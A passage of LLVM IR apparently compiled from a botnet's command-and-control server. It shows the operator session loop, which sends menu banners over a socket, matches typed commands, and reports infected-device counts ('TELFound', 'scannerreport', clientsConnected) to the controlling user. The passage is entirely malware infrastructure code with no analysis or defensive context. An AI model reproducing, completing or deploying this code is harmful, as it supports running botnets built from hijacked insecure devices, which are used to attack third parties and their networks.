  %475 = getelementptr inbounds [90000 x i8], [90000 x i8]* %39, i64 0, i64 0
  %476 = getelementptr inbounds [90000 x i8], [90000 x i8]* %39, i64 0, i64 0
  %477 = call i64 @strlen(i8* %476) #8
  %478 = call i64 @send(i32 %474, i8* %475, i64 %477, i32 16384)
  %479 = icmp eq i64 %478, -1
  br i1 %479, label %480, label %481

480:                                              ; preds = %473
  br label %2321

481:                                              ; preds = %473
  %482 = load i32, i32* %5, align 4
  %483 = getelementptr inbounds [90000 x i8], [90000 x i8]* %40, i64 0, i64 0
  %484 = getelementptr inbounds [90000 x i8], [90000 x i8]* %40, i64 0, i64 0
  %485 = call i64 @strlen(i8* %484) #8
  %486 = call i64 @send(i32 %482, i8* %483, i64 %485, i32 16384)
  %487 = icmp eq i64 %486, -1
  br i1 %487, label %488, label %489

488:                                              ; preds = %481
  br label %2321

489:                                              ; preds = %481
  %490 = load i32, i32* %5, align 4
  %491 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i64 0, i64 0
  %492 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i64 0, i64 0
  %493 = call i64 @strlen(i8* %492) #8
  %494 = call i64 @send(i32 %490, i8* %491, i64 %493, i32 16384)
  %495 = icmp eq i64 %494, -1
  br i1 %495, label %496, label %497

496:                                              ; preds = %489
  br label %2321

497:                                              ; preds = %489
  %498 = load i32, i32* %5, align 4
  %499 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i64 0, i64 0
  %500 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i64 0, i64 0
  %501 = call i64 @strlen(i8* %500) #8
  %502 = call i64 @send(i32 %498, i8* %499, i64 %501, i32 16384)
  %503 = icmp eq i64 %502, -1
  br i1 %503, label %504, label %505

504:                                              ; preds = %497
  br label %2321

505:                                              ; preds = %497
  br label %506

506:                                              ; preds = %505
  %507 = load i32, i32* %5, align 4
  %508 = call i64 @send(i32 %507, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.55, i64 0, i64 0), i64 24, i32 16384)
  %509 = icmp eq i64 %508, -1
  br i1 %509, label %510, label %511

510:                                              ; preds = %506
  br label %2321

511:                                              ; preds = %506
  br label %512

512:                                              ; preds = %511
  %513 = load i8*, i8** %3, align 8
  %514 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %513) #9
  %515 = load i32, i32* %5, align 4
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %516
  %518 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %517, i32 0, i32 0
  store i32 1, i32* %518, align 4
  br label %519

519:                                              ; preds = %2297, %2296, %1821, %1336, %1270, %1164, %1058, %892, %512
  %520 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %521 = load i32, i32* %5, align 4
  %522 = call i32 @fdgets(i8* %520, i32 2048, i32 %521)
  %523 = icmp sgt i32 %522, 0
  br i1 %523, label %524, label %2320

524:                                              ; preds = %519
  %525 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %526 = call i8* @strstr(i8* %525, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.56, i64 0, i64 0)) #8
  %527 = icmp ne i8* %526, null
  br i1 %527, label %528, label %541

528:                                              ; preds = %524
  %529 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %530 = load volatile i32, i32* @TELFound, align 4
  %531 = load volatile i32, i32* @scannerreport, align 4
  %532 = call i32 (i8*, i8*, ...) @sprintf(i8* %529, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.57, i64 0, i64 0), i32 %530, i32 %531) #9
  %533 = load i32, i32* %5, align 4
  %534 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %535 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %536 = call i64 @strlen(i8* %535) #8
  %537 = call i64 @send(i32 %533, i8* %534, i64 %536, i32 16384)
  %538 = icmp eq i64 %537, -1
  br i1 %538, label %539, label %540

539:                                              ; preds = %528
  store i8* null, i8** %2, align 8
  br label %2330

540:                                              ; preds = %528
  br label %541

541:                                              ; preds = %540, %524
  %542 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %543 = call i8* @strstr(i8* %542, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.58, i64 0, i64 0)) #8
  %544 = icmp ne i8* %543, null
  br i1 %544, label %545, label %558

545:                                              ; preds = %541
  %546 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %547 = load volatile i32, i32* @TELFound, align 4
  %548 = load volatile i32, i32* @scannerreport, align 4
  %549 = call i32 (i8*, i8*, ...) @sprintf(i8* %546, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.59, i64 0, i64 0), i32 %547, i32 %548) #9
  %550 = load i32, i32* %5, align 4
  %551 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %552 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %553 = call i64 @strlen(i8* %552) #8
  %554 = call i64 @send(i32 %550, i8* %551, i64 %553, i32 16384)
  %555 = icmp eq i64 %554, -1
  br i1 %555, label %556, label %557

556:                                              ; preds = %545
  store i8* null, i8** %2, align 8
  br label %2330

557:                                              ; preds = %545
  br label %558

558:                                              ; preds = %557, %541
  %559 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %560 = call i8* @strstr(i8* %559, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0)) #8
  %561 = icmp ne i8* %560, null
  br i1 %561, label %562, label %575

562:                                              ; preds = %558
  %563 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %564 = call i32 @clientsConnected()
  %565 = load volatile i32, i32* @managesConnected, align 4
  %566 = call i32 (i8*, i8*, ...) @sprintf(i8* %563, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.61, i64 0, i64 0), i32 %564, i32 %565) #9
  %567 = load i32, i32* %5, align 4
  %568 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %569 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %570 = call i64 @strlen(i8* %569) #8
  %571 = call i64 @send(i32 %567, i8* %568, i64 %570, i32 16384)
  %572 = icmp eq i64 %571, -1
  br i1 %572, label %573, label %574

573:                                              ; preds = %562
  store i8* null, i8** %2, align 8
  br label %2330

574:                                              ; preds = %562
  br label %575

575:                                              ; preds = %574, %558
  %576 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %577 = call i8* @strstr(i8* %576, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i64 0, i64 0)) #8
  %578 = icmp ne i8* %577, null
  br i1 %578, label %579, label %590

579:                                              ; preds = %575
  %580 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %581 = call i32 (i8*, i8*, ...) @sprintf(i8* %580, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.63, i64 0, i64 0)) #9
  %582 = load i32, i32* %5, align 4
  %583 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %584 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %585 = call i64 @strlen(i8* %584) #8
  %586 = call i64 @send(i32 %582, i8* %583, i64 %585, i32 16384)
  %587 = icmp eq i64 %586, -1
  br i1 %587, label %588, label %589

588:                                              ; preds = %579
  store i8* null, i8** %2, align 8
  br label %2330

589:                                              ; preds = %579
  br label %590

590:                                              ; preds = %589, %575
  %591 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %592 = call i8* @strstr(i8* %591, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.64, i64 0, i64 0)) #8
  %593 = icmp ne i8* %592, null
  br i1 %593, label %594, label %607

594:                                              ; preds = %590
  %595 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %596 = call i32 @clientsConnected()
  %597 = load volatile i32, i32* @managesConnected, align 4
  %598 = call i32 (i8*, i8*, ...) @sprintf(i8* %595, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.61, i64 0, i64 0), i32 %596, i32 %597) #9
  %599 = load i32, i32* %5, align 4
  %600 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %601 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %602 = call i64 @strlen(i8* %601) #8
  %603 = call i64 @send(i32 %599, i8* %600, i64 %602, i32 16384)
  %604 = icmp eq i64 %603, -1
  br i1 %604, label %605, label %606

605:                                              ; preds = %594
  store i8* null, i8** %2, align 8
  br label %2330

606:                                              ; preds = %594
  br label %607

607:                                              ; preds = %606, %590
  %608 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %609 = call i8* @strstr(i8* %608, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.65, i64 0, i64 0)) #8
  %610 = icmp ne i8* %609, null
  br i1 %610, label %611, label %622

611:                                              ; preds = %607
  %612 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %613 = call i32 (i8*, i8*, ...) @sprintf(i8* %612, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.66, i64 0, i64 0)) #9
  %614 = load i32, i32* %5, align 4
  %615 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %616 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %617 = call i64 @strlen(i8* %616) #8
  %618 = call i64 @send(i32 %614, i8* %615, i64 %617, i32 16384)
  %619 = icmp eq i64 %618, -1
  br i1 %619, label %620, label %621

620:                                              ; preds = %611
  store i8* null, i8** %2, align 8
  br label %2330

621:                                              ; preds = %611
  br label %622

622:                                              ; preds = %621, %607
  %623 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %624 = call i8* @strstr(i8* %623, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.67, i64 0, i64 0)) #8
  %625 = icmp ne i8* %624, null
  br i1 %625, label %626, label %637

626:                                              ; preds = %622
  %627 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %628 = call i32 (i8*, i8*, ...) @sprintf(i8* %627, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.68, i64 0, i64 0)) #9
  %629 = load i32, i32* %5, align 4
  %630 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %631 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %632 = call i64 @strlen(i8* %631) #8
  %633 = call i64 @send(i32 %629, i8* %630, i64 %632, i32 16384)
  %634 = icmp eq i64 %633, -1
  br i1 %634, label %635, label %636

635:                                              ; preds = %626
  store i8* null, i8** %2, align 8
  br label %2330

636:                                              ; preds = %626
  br label %637

637:                                              ; preds = %636, %622
  %638 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %639 = call i8* @strstr(i8* %638, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0)) #8
  %640 = icmp ne i8* %639, null
  br i1 %640, label %641, label %652

641:                                              ; preds = %637
  %642 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %643 = call i32 (i8*, i8*, ...) @sprintf(i8* %642, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.70, i64 0, i64 0)) #9
  %644 = load i32, i32* %5, align 4
  %645 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %646 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %647 = call i64 @strlen(i8* %646) #8
  %648 = call i64 @send(i32 %644, i8* %645, i64 %647, i32 16384)
  %649 = icmp eq i64 %648, -1
  br i1 %649, label %650, label %651

650:                                              ; preds = %641
  store i8* null, i8** %2, align 8
  br label %2330

651:                                              ; preds = %641
  br label %652

652:                                              ; preds = %651, %637
  %653 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %654 = call i8* @strstr(i8* %653, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i64 0, i64 0)) #8
  %655 = icmp ne i8* %654, null
  br i1 %655, label %656, label %667

656:                                              ; preds = %652
  %657 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %658 = call i32 (i8*, i8*, ...) @sprintf(i8* %657, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.72, i64 0, i64 0)) #9
  %659 = load i32, i32* %5, align 4
  %660 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %661 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %662 = call i64 @strlen(i8* %661) #8
  %663 = call i64 @send(i32 %659, i8* %660, i64 %662, i32 16384)
  %664 = icmp eq i64 %663, -1
  br i1 %664, label %665, label %666

665:                                              ; preds = %656
  store i8* null, i8** %2, align 8
  br label %2330

666:                                              ; preds = %656
  br label %667

667:                                              ; preds = %666, %652
  %668 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %669 = call i8* @strstr(i8* %668, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.73, i64 0, i64 0)) #8
  %670 = icmp ne i8* %669, null
  br i1 %670, label %671, label %682

671:                                              ; preds = %667
  %672 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %673 = call i32 (i8*, i8*, ...) @sprintf(i8* %672, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.74, i64 0, i64 0)) #9
  %674 = load i32, i32* %5, align 4
  %675 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %676 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %677 = call i64 @strlen(i8* %676) #8
  %678 = call i64 @send(i32 %674, i8* %675, i64 %677, i32 16384)
  %679 = icmp eq i64 %678, -1
  br i1 %679, label %680, label %681

680:                                              ; preds = %671
  store i8* null, i8** %2, align 8
  br label %2330

681:                                              ; preds = %671
  br label %682

682:                                              ; preds = %681, %667
  %683 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %684 = call i8* @strstr(i8* %683, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.75, i64 0, i64 0)) #8
  %685 = icmp ne i8* %684, null
  br i1 %685, label %686, label %697

686:                                              ; preds = %682
  %687 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %688 = call i32 (i8*, i8*, ...) @sprintf(i8* %687, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.76, i64 0, i64 0)) #9
  %689 = load i32, i32* %5, align 4
  %690 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %691 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %692 = call i64 @strlen(i8* %691) #8
  %693 = call i64 @send(i32 %689, i8* %690, i64 %692, i32 16384)
  %694 = icmp eq i64 %693, -1
  br i1 %694, label %695, label %696

695:                                              ; preds = %686
  store i8* null, i8** %2, align 8
  br label %2330

696:                                              ; preds = %686
  br label %697

697:                                              ; preds = %696, %682
  %698 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %699 = call i8* @strstr(i8* %698, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.77, i64 0, i64 0)) #8
  %700 = icmp ne i8* %699, null
  br i1 %700, label %701, label %712

701:                                              ; preds = %697
  %702 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %703 = call i32 (i8*, i8*, ...) @sprintf(i8* %702, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.78, i64 0, i64 0)) #9
  %704 = load i32, i32* %5, align 4
  %705 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %706 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %707 = call i64 @strlen(i8* %706) #8
  %708 = call i64 @send(i32 %704, i8* %705, i64 %707, i32 16384)
  %709 = icmp eq i64 %708, -1
  br i1 %709, label %710, label %711

710:                                              ; preds = %701
  store i8* null, i8** %2, align 8
  br label %2330

711:                                              ; preds = %701
  br label %712

712:                                              ; preds = %711, %697
  %713 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %714 = call i8* @strstr(i8* %713, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.65, i64 0, i64 0)) #8
  %715 = icmp ne i8* %714, null
  br i1 %715, label %716, label %727

716:                                              ; preds = %712
  %717 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %718 = call i32 (i8*, i8*, ...) @sprintf(i8* %717, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.66, i64 0, i64 0)) #9
  %719 = load i32, i32* %5, align 4
  %720 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %721 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %722 = call i64 @strlen(i8* %721) #8
  %723 = call i64 @send(i32 %719, i8* %720, i64 %722, i32 16384)
  %724 = icmp eq i64 %723, -1
  br i1 %724, label %725, label %726

725:                                              ; preds = %716
  store i8* null, i8** %2, align 8
  br label %2330

726:                                              ; preds = %716
  br label %727

727:                                              ; preds = %726, %712
  %728 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %729 = call i8* @strstr(i8* %728, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.79, i64 0, i64 0)) #8
  %730 = icmp ne i8* %729, null
  br i1 %730, label %731, label %893

731:                                              ; preds = %727
  %732 = load i8*, i8** %3, align 8
  %733 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %732) #9
  %734 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i64 0, i64 0
  %735 = call i32 (i8*, i8*, ...) @sprintf(i8* %734, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.80, i64 0, i64 0)) #9
  %736 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i64 0, i64 0
  %737 = call i32 (i8*, i8*, ...) @sprintf(i8* %736, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.81, i64 0, i64 0)) #9
  %738 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i64 0, i64 0
  %739 = call i32 (i8*, i8*, ...) @sprintf(i8* %738, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.82, i64 0, i64 0)) #9
  %740 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i64 0, i64 0
  %741 = call i32 (i8*, i8*, ...) @sprintf(i8* %740, i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.83, i64 0, i64 0)) #9
  %742 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i64 0, i64 0
  %743 = call i32 (i8*, i8*, ...) @sprintf(i8* %742, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.84, i64 0, i64 0)) #9
  %744 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i64 0, i64 0
  %745 = call i32 (i8*, i8*, ...) @sprintf(i8* %744, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.85, i64 0, i64 0)) #9
  %746 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %747 = call i32 (i8*, i8*, ...) @sprintf(i8* %746, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.86, i64 0, i64 0)) #9
  %748 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i64 0, i64 0
  %749 = call i32 (i8*, i8*, ...) @sprintf(i8* %748, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.87, i64 0, i64 0)) #9
  %750 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i64 0, i64 0
  %751 = call i32 (i8*, i8*, ...) @sprintf(i8* %750, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.88, i64 0, i64 0)) #9
  %752 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i64 0, i64 0
  %753 = call i32 (i8*, i8*, ...) @sprintf(i8* %752, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.81, i64 0, i64 0)) #9
  %754 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i64 0, i64 0
  %755 = call i32 (i8*, i8*, ...) @sprintf(i8* %754, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.89, i64 0, i64 0)) #9
  %756 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i64 0, i64 0
  %757 = call i32 (i8*, i8*, ...) @sprintf(i8* %756, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.90, i64 0, i64 0)) #9
  %758 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i64 0, i64 0
  %759 = call i32 (i8*, i8*, ...) @sprintf(i8* %758, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.91, i64 0, i64 0)) #9
  %760 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i64 0, i64 0
  %761 = call i32 (i8*, i8*, ...) @sprintf(i8* %760, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.92, i64 0, i64 0)) #9
  %762 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i64 0, i64 0
  %763 = call i32 (i8*, i8*, ...) @sprintf(i8* %762, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.93, i64 0, i64 0)) #9
  %764 = load i32, i32* %5, align 4
  %765 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i64 0, i64 0
  %766 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i64 0, i64 0
  %767 = call i64 @strlen(i8* %766) #8
  %768 = call i64 @send(i32 %764, i8* %765, i64 %767, i32 16384)
  %769 = icmp eq i64 %768, -1
  br i1 %769, label %770, label %771

770:                                              ; preds = %731
  br label %2321

771:                                              ; preds = %731
  %772 = load i32, i32* %5, align 4
  %773 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i64 0, i64 0
  %774 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i64 0, i64 0
  %775 = call i64 @strlen(i8* %774) #8
  %776 = call i64 @send(i32 %772, i8* %773, i64 %775, i32 16384)
  %777 = icmp eq i64 %776, -1
  br i1 %777, label %778, label %779

778:                                              ; preds = %771
  br label %2321

779:                                              ; preds = %771
  %780 = load i32, i32* %5, align 4
  %781 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i64 0, i64 0
  %782 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i64 0, i64 0
  %783 = call i64 @strlen(i8* %782) #8
  %784 = call i64 @send(i32 %780, i8* %781, i64 %783, i32 16384)
  %785 = icmp eq i64 %784, -1
  br i1 %785, label %786, label %787

786:                                              ; preds = %779
  br label %2321

787:                                              ; preds = %779
  %788 = load i32, i32* %5, align 4
  %789 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i64 0, i64 0
  %790 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i64 0, i64 0
  %791 = call i64 @strlen(i8* %790) #8
  %792 = call i64 @send(i32 %788, i8* %789, i64 %791, i32 16384)
  %793 = icmp eq i64 %792, -1
  br i1 %793, label %794, label %795

794:                                              ; preds = %787
  br label %2321

795:                                              ; preds = %787
  %796 = load i32, i32* %5, align 4
  %797 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i64 0, i64 0
  %798 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i64 0, i64 0
  %799 = call i64 @strlen(i8* %798) #8
  %800 = call i64 @send(i32 %796, i8* %797, i64 %799, i32 16384)
  %801 = icmp eq i64 %800, -1
  br i1 %801, label %802, label %803

802:                                              ; preds = %795
  br label %2321

803:                                              ; preds = %795
  %804 = load i32, i32* %5, align 4
  %805 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i64 0, i64 0
  %806 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i64 0, i64 0
  %807 = call i64 @strlen(i8* %806) #8
  %808 = call i64 @send(i32 %804, i8* %805, i64 %807, i32 16384)
  %809 = icmp eq i64 %808, -1
  br i1 %809, label %810, label %811

810:                                              ; preds = %803
  br label %2321

811:                                              ; preds = %803
  %812 = load i32, i32* %5, align 4
  %813 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %814 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %815 = call i64 @strlen(i8* %814) #8
  %816 = call i64 @send(i32 %812, i8* %813, i64 %815, i32 16384)
  %817 = icmp eq i64 %816, -1
  br i1 %817, label %818, label %819

818:                                              ; preds = %811
  br label %2321

819:                                              ; preds = %811
  %820 = load i32, i32* %5, align 4
  %821 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i64 0, i64 0
  %822 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i64 0, i64 0
  %823 = call i64 @strlen(i8* %822) #8
  %824 = call i64 @send(i32 %820, i8* %821, i64 %823, i32 16384)
  %825 = icmp eq i64 %824, -1
  br i1 %825, label %826, label %827

826:                                              ; preds = %819
  br label %2321

827:                                              ; preds = %819
  %828 = load i32, i32* %5, align 4
  %829 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i64 0, i64 0
  %830 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i64 0, i64 0
  %831 = call i64 @strlen(i8* %830) #8
  %832 = call i64 @send(i32 %828, i8* %829, i64 %831, i32 16384)
  %833 = icmp eq i64 %832, -1
  br i1 %833, label %834, label %835

834:                                              ; preds = %827
  br label %2321

835:                                              ; preds = %827
  %836 = load i32, i32* %5, align 4
  %837 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i64 0, i64 0
  %838 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i64 0, i64 0
  %839 = call i64 @strlen(i8* %838) #8
  %840 = call i64 @send(i32 %836, i8* %837, i64 %839, i32 16384)
  %841 = icmp eq i64 %840, -1
  br i1 %841, label %842, label %843

842:                                              ; preds = %835
  br label %2321

843:                                              ; preds = %835
  %844 = load i32, i32* %5, align 4
  %845 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i64 0, i64 0
  %846 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i64 0, i64 0
  %847 = call i64 @strlen(i8* %846) #8
  %848 = call i64 @send(i32 %844, i8* %845, i64 %847, i32 16384)
  %849 = icmp eq i64 %848, -1
  br i1 %849, label %850, label %851

850:                                              ; preds = %843
  br label %2321

851:                                              ; preds = %843
  %852 = load i32, i32* %5, align 4
  %853 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i64 0, i64 0
  %854 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i64 0, i64 0
  %855 = call i64 @strlen(i8* %854) #8
  %856 = call i64 @send(i32 %852, i8* %853, i64 %855, i32 16384)
  %857 = icmp eq i64 %856, -1
  br i1 %857, label %858, label %859

858:                                              ; preds = %851
  br label %2321

859:                                              ; preds = %851
  %860 = load i32, i32* %5, align 4
  %861 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i64 0, i64 0
  %862 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i64 0, i64 0
  %863 = call i64 @strlen(i8* %862) #8
  %864 = call i64 @send(i32 %860, i8* %861, i64 %863, i32 16384)
  %865 = icmp eq i64 %864, -1
  br i1 %865, label %866, label %867

866:                                              ; preds = %859
  br label %2321

867:                                              ; preds = %859
  %868 = load i32, i32* %5, align 4
  %869 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i64 0, i64 0
  %870 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i64 0, i64 0
  %871 = call i64 @strlen(i8* %870) #8
  %872 = call i64 @send(i32 %868, i8* %869, i64 %871, i32 16384)
  %873 = icmp eq i64 %872, -1
  br i1 %873, label %874, label %875

874:                                              ; preds = %867
  br label %2321

875:                                              ; preds = %867
  %876 = load i32, i32* %5, align 4
  %877 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i64 0, i64 0
  %878 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i64 0, i64 0
  %879 = call i64 @strlen(i8* %878) #8
  %880 = call i64 @send(i32 %876, i8* %877, i64 %879, i32 16384)
  %881 = icmp eq i64 %880, -1
  br i1 %881, label %882, label %883

882:                                              ; preds = %875
  br label %2321

883:                                              ; preds = %875
  %884 = load i8*, i8** %3, align 8
  %885 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %884) #9
  br label %886

886:                                              ; preds = %883
  %887 = load i32, i32* %5, align 4
  %888 = call i64 @send(i32 %887, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.55, i64 0, i64 0), i64 24, i32 16384)
  %889 = icmp eq i64 %888, -1
  br i1 %889, label %890, label %891

890:                                              ; preds = %886
  br label %2321

891:                                              ; preds = %886
  br label %892

892:                                              ; preds = %891
  br label %519, !llvm.loop !19

